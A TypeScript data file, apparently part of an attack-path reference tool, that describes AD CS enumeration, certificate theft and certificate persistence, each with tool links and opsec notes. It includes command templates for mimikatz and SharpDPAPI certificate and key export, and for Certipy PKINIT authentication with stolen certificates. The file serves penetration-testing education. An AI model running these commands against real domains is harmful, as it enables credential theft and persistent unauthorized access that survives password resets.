import type { AttackEdge, TechniqueNodeDef } from '../schema';
import { mitre, r } from '../lib';

/** AD CS certificate theft & persistence (Certipy THEFT/PERSIST families), plus the
 *  enumeration step that precedes the whole ESC family. */
export const adAdcsExtraNodes: TechniqueNodeDef[] = [
  {
    id: 'adcs-enum',
    aliases: ['Certipy Find'],
    label: 'AD CS Enumeration',
    phase: 'enumeration',
    needs: 'domain-user',
    summary: 'Run certipy find to inventory CAs and templates and name which ESC path is live.',
    description:
      'Authenticated enumeration of Active Directory Certificate Services: inventory the enterprise CAs and certificate templates and flag the misconfigurations behind the ESC1-ESC17 family. Certipy parses template flags, EKUs, enrollment rights, and CA settings and names the exact escalation path available. The output tells you which ESC primitive to pivot into next; it does not compromise anything by itself. Re-run it as each new principal is compromised, since vulnerable templates are scoped by enrollment rights.',
    tools: [
      { name: 'Certipy', url: 'https://github.com/ly4k/Certipy' },
      { name: 'Certify (GhostPack)', url: 'https://github.com/GhostPack/Certify' },
      { name: 'NetExec (adcs module)', url: 'https://github.com/Pennyw0rth/NetExec' },
    ],
    commands: [
      { label: 'Confirm AD CS exists (locate the enrollment server / CA)', code: r`nxc ldap <DC_IP> -u <user> -p '<pass>' -M adcs`, lang: 'bash' },
      { label: 'Enumerate only the vulnerable templates / CAs (Certipy)', code: r`certipy find -u <user>@domain.local -p '<pass>' -dc-ip <DC_IP> -vulnerable -enabled -stdout   # auth: -hashes :<NTHASH> | -k -no-pass`, lang: 'bash' },
      { label: 'Capture the full inventory for offline review / BloodHound', code: r`certipy find -u <user>@domain.local -p '<pass>' -dc-ip <DC_IP> -text -stdout`, lang: 'bash' },
      { label: 'From a Windows foothold, corroborate with native tooling', code: r`certutil -CATemplates & .\Certify.exe find /vulnerable`, lang: 'cmd' },
    ],
    mitre: mitre('T1649'),
    references: [
      { label: 'SpecterOps, Certified Pre-Owned (AD CS abuse whitepaper)', url: 'https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf' },
      { label: 'ly4k (ifcr), Certipy 4.0 (ESC enumeration)', url: 'https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7' },
      { label: 'Microsoft, MS-WCCE (AD CS protocol)', url: 'https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-wcce/' },
    ],
    requires: ['Valid domain credentials (password, NT hash, or Kerberos ticket)', 'LDAP / RPC reachability to a DC and an AD CS enterprise CA'],
    opsec: 'certipy find is read-only LDAP/RPC enumeration, so it is quiet and low-risk; the noise comes later when you enroll or relay. Re-run it from each principal you gain, since enrollment rights differ per account.',
  },
  {
    id: 'adcs-cert-theft',
    label: 'Certificate Theft (THEFT1-5)',
    phase: 'credential-access',
    needs: 'shell',
    summary: "Steal client-auth certificates + private keys from a compromised host's stores or disk, then PKINIT as the owner.",
    description:
      "On a host you control, harvest existing client-authentication certificates and their private keys: export them from the certificate store via CryptoAPI/CNG (THEFT1), decrypt user certs/keys from the DPAPI-protected store with the user's masterkey (THEFT2) or machine certs/keys via DPAPI (THEFT3, needs SYSTEM to reach the DPAPI_SYSTEM LSA secret / machine masterkeys), or find PFX files left on disk (THEFT4). A stolen client-auth cert is then used with PKINIT to obtain the owner's TGT, and from that TGT the account's NTLM hash via UnPAC-the-hash (THEFT5), giving access that survives password resets.",
    tools: [
      { name: 'Certipy', url: 'https://github.com/ly4k/Certipy' },
      { name: 'SharpDPAPI (certificates)', url: 'https://github.com/GhostPack/SharpDPAPI' },
      { name: 'mimikatz (crypto::)', url: 'https://github.com/gentilkiwi/mimikatz' },
    ],
    commands: [
      { label: 'Export machine certs + keys (SharpDPAPI)', code: r`SharpDPAPI.exe certificates /machine`, lang: 'cmd' },
      { label: 'Patch CAPI/CNG, then export from the cert store (mimikatz)', code: r`privilege::debug
crypto::capi
crypto::cng
crypto::certificates /systemstore:CERT_SYSTEM_STORE_LOCAL_MACHINE /export`, lang: 'text' },
      { label: 'Authenticate with the stolen cert (PKINIT)', code: r`certipy-ad auth -pfx stolen.pfx -dc-ip 10.0.0.1`, lang: 'bash' },
    ],
    mitre: mitre('T1649'),
    references: [
      { label: 'HackTricks, AD CS Certificate Theft', url: 'https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/ad-certificates/certificate-theft.html' },
      { label: 'SpecterOps, Certified Pre-Owned (Certificate Theft)', url: 'https://specterops.io/blog/2021/06/17/certified-pre-owned/' },
      { label: 'The Hacker Recipes, Certificate templates', url: 'https://www.thehacker.recipes/ad/movement/adcs/certificate-templates' },
    ],
    requires: ['Local admin / the target user context on a host holding a client-auth certificate'],
    opsec: 'Reading the cert store / DPAPI masterkeys is quieter than touching LSASS; the loud part is PKINIT auth with the stolen cert. Certs survive password resets, so theft doubles as stealthy persistence.',
  },
  {
    id: 'adcs-cert-persist',
    label: 'Certificate Persistence (PERSIST1-3)',
    phase: 'persistence',
    needs: 'domain-user',
    summary: 'Enroll a client-auth certificate for a compromised account: valid ~1 year and surviving password resets.',
    description:
      "Once you control an account, enroll a client-authentication certificate for a user you control (PERSIST1) or for a computer account you control (PERSIST2), or renew an existing certificate before it expires (PERSIST3). Because certificates authenticate via PKINIT independently of the password, the cert keeps working for its full validity (often a year or more) even after the account's password is reset; a password rotation does not evict it. (Enrolling on behalf of ANOTHER user via an enrollment-agent cert is ESC3, not persistence.)",
    tools: [
      { name: 'Certipy', url: 'https://github.com/ly4k/Certipy' },
      { name: 'Certify (GhostPack)', url: 'https://github.com/GhostPack/Certify' },
    ],
    commands: [
      { label: 'Enroll a client-auth cert for the current user', code: r`certipy-ad req -u user@corp.local -p PASS -ca CORP-CA -template User`, lang: 'bash' },
      { label: 'Later: authenticate with the cert (PKINIT)', code: r`certipy-ad auth -pfx user.pfx -dc-ip 10.0.0.1`, lang: 'bash' },
    ],
    mitre: mitre('T1649'),
    references: [
      { label: 'HackTricks, AD CS Account Persistence', url: 'https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/ad-certificates/account-persistence.html' },
      { label: 'SpecterOps, Certified Pre-Owned (Persistence)', url: 'https://specterops.io/blog/2021/06/17/certified-pre-owned/' },
      { label: 'The Hacker Recipes, Certificate templates', url: 'https://www.thehacker.recipes/ad/movement/adcs/certificate-templates' },
    ],
    requires: ['Control of the target account', 'Enrollment rights to a client-auth template', 'PERSIST2 (machine account) also needs local admin / SYSTEM on the target host to enroll as the computer; PERSIST1 (user) is reachable from a plain domain-user context'],
    opsec: 'Enrollment is logged (4886/4887) but blends with normal PKI activity; the cert then authenticates without further enrollment, surviving password changes. Evicting requires revoking the cert, not just resetting the password.',
  },
];

export const adAdcsExtraEdges: AttackEdge[] = [
  // Enumeration is the discovery gate for the whole ESC family: ad-cat-adcs flows into
  // it, and it branches to the two abuse sub-categories (these reroute the former direct
  // ad-cat-adcs → sub-category edges, which moved out of ad-categories.ts).
  { source: 'ad-cat-adcs', target: 'adcs-enum', description: "Indicators this path applies: a pKIEnrollmentService object under CN=Enrollment Services,CN=Public Key Services (an Enterprise CA is published); the nxc/certipy adcs enumeration reports a CA and templates; Certipy output lists a 'Vulnerabilities' section tagged ESC1-ESC16." },
  { source: 'adcs-enum', target: 'ad-cat-adcs-template', label: 'template ESCs' },
  { source: 'adcs-enum', target: 'ad-cat-adcs-ca', label: 'CA / relay / forge' },
  { source: 'ad-cat-user-secrets', target: 'adcs-cert-theft', description: 'Indicators this path applies: an existing client-authentication certificate and its private key are recoverable from the compromised host (the user or machine MY store, an exported .pfx, or a DPAPI-protected key); certutil -store, Mimikatz crypto::certificates /export, or Certipy reveals an exportable cert; the stolen cert can then PKINIT as its owner.' },
  { source: 'adcs-cert-theft', target: 'pass-the-certificate', label: 'PKINIT as owner' },
  { source: 'persist-fed', target: 'adcs-cert-persist' },
  { source: 'adcs-cert-persist', target: 'pass-the-certificate', label: 'durable PKINIT' },
];
